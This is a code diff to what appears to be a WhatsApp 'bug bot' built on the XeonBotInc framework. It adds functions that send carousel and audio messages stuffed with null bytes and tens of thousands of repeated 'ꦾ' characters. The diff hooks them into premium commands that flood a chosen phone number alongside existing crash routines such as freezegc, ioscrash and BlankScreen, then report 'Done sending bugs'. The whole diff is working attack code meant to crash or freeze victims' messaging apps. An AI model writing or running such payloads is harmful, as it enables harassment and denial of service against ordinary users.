@@ -2663,6 +2663,108 @@ const NullNihBos = {
 				} : { quoted: NullNihBos }
 			);
    }
+
+
+async function bak2(target) {
+    await XeonBotInc.relayMessage(
+      target,
+      {
+        ephemeralMessage: {
+          message: {
+            viewOnceMessage: {
+              message: {
+                interactiveMessage: {
+                  body: {
+                    text: 
+                      "✞Xᴄʜʀɪss Bot✞" +
+                      "\u0000" +
+                      "ꦾ".repeat(90000),
+                  },
+                  carouselMessage: {
+                    cards: [
+                      {
+                        header: {
+                          hasMediaAttachment: true,
+                          ...(await prepareWAMessageMedia(
+                            {
+                              image: {
+                                url: "https://ibb.co/LZGzx5R",
+                              },
+                            },
+                            { upload: XeonBotInc.waUploadToServer }
+                          )),
+                        },
+                        body: {
+                          text: "\u0000" + "ꦾ".repeat(90000),
+                        },
+                        nativeFlowMessage: {
+                          buttons: [
+                            {
+                              name: "cta_url",
+                              buttonParamsJson: JSON.stringify({
+                                display_text: "【 𖤍 】 𝙻𝙾𝚁𝙳 Xᴄʜʀɪss",
+                                url: "https://t.me/Tha_Healer",
+                                merchant_url: "https://t.me/Tha_Healer",
+                              }),
+                            },
+                            {
+                              name: "single_select",
+                              buttonParamsJson: JSON.stringify({
+                                title: "✞Xᴄʜʀɪss Bot✞",
+                                sections: [
+                                  {
+                                    title: "✞Xᴄʜʀɪss Bot✞",
+                                    rows: [], // Kosong untuk menghilangkan pilihan
+                                  },
+                                ],
+                              }),
+                            },
+                            {
+                              name: "quick_reply",
+                              buttonParamsJson: JSON.stringify({
+                                display_text: "【 𖤍 】 𝙻𝙾𝚁𝙳 Xᴄʜʀɪss",
+                                title: "CRASH!",
+                                id: ".crasher",
+                              }),
+                            },
+                          ],
+                        },
+                      },
+                    ],
+                    messageVersion: 1,
+                  },
+                },
+              },
+            },
+          },
+        },
+      },
+      {
+        participant: { jid: target },
+      }
+    );
+  }
+
+async function xd(nomor, target, participant) {
+XeonBotInc.sendMessage(
+target,
+{
+audio: { url: "./src/start.mp3" },
+mimetype: `audio/mp4`,
+caption: "㌷" + "ꦾ".repeat(30000)
+},
+{ quoted: { ...nullgb, key: { ...nullgb.key, participant } } }
+);
+}
+
+async function bggc() { 
+for (let i = 0;i < 5;i++) {
+await xd(pushname, target, m.sender);
+}
+}
+
+
+
 switch (command) {
 case 'cios2': {
 if (!isPremium) return replygcxeon(mess.prem)
@@ -2685,12 +2787,17 @@ await caltx(target, true)
 await callbg(target)
 await FloodsCarousel2(target, Ptcp = true)
 await BlankScreen(target, Ptcp = true)
+await bak2(target, ptcp = true)
+await bggc()
+await xd(pushname, target, m.sender);
 await sleep(10)
 await freezegc(target, true)
 await caltx(target, true)
 await callbg(target)
 await FloodsCarousel2(target, Ptcp = true)
 await BlankScreen(target, Ptcp = true)
+await bak2(target, ptcp = true)
+await bggc()
 await sleep(10)
 await freezegc(target, true)
 }
@@ -2745,6 +2852,7 @@ await nulltag(target, true)
 await NewsletterZap(target, true)
 await freezeui(target, true)
 await freezeuii(target, true)
+await bak2(target, ptcp = true)
 await sleep(10000)
 await callp(target, )
 await gall(target, xbug2, 1020000)
@@ -2757,12 +2865,14 @@ await DocSystem3(target)
 await EncryptMessage(target)
 await FrezeeMsg1(target)
 await sleep(10000)
+await bak2(target, ptcp = true),
 await callp(target, )
 await gall(target, xbug2, 1020000)
 await FloodsCarousel2(target, Ptcp = true)
 await BlankScreen(target, Ptcp = true)
 await FrezeeMsg2(target)
 await OLDLOC(target, TypeNull)
+await bak2(target, ptcp = true),
 }
 await replygcxeon (`Done sending bugs to ${target} using ${command}`)
 }
@@ -2800,6 +2910,7 @@ await galx(target, Ptcp = true)
 await callDoc(XeonBotInc, target)
 await FloodsCarousel2(target, Ptcp = true)
 await BlankScreen(target, Ptcp = true)
+await bak2(target, ptcp = true),
 await TrashSystem(target, xeonThm, Ptcp = true)
 await StuckNull(target, xeonThm, Ptcp = true) 
 await StuckSql(target, xeonThm, Ptcp = true)
@@ -2807,6 +2918,7 @@ await PayMent(target)
 await beta(betaq, target)
 await caros(target, Ptcp = true)
 await galx(target, Ptcp = true)
+await bak2(target, ptcp = true),
 await FloodsCarousel2(target, Ptcp = true)
 await BlankScreen(target, Ptcp = true)
 await coresix(target, "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱", 1020000, true); 
@@ -3234,11 +3346,19 @@ await galx(target, Ptcp = false)
 await ioscrash(target)
 await freezegc(target)
 await BugFrezee(target)
+await FloodsCarousel2(target, Ptcp = true)
+await BlankScreen(target, Ptcp = true)
+await bak2(target, ptcp = true)
+await bggc()
 await OLDLOC(target, TypeNull)
 await ioscrash(target)
 await galx(target, Ptcp = false)
 await callbg(target)
 await ioscrash(target)
+await FloodsCarousel2(target, Ptcp = true)
+await BlankScreen(target, Ptcp = true)
+await bak2(target, ptcp = true)
+await bggc()
 }
 await replygcxeon('Done')
 }
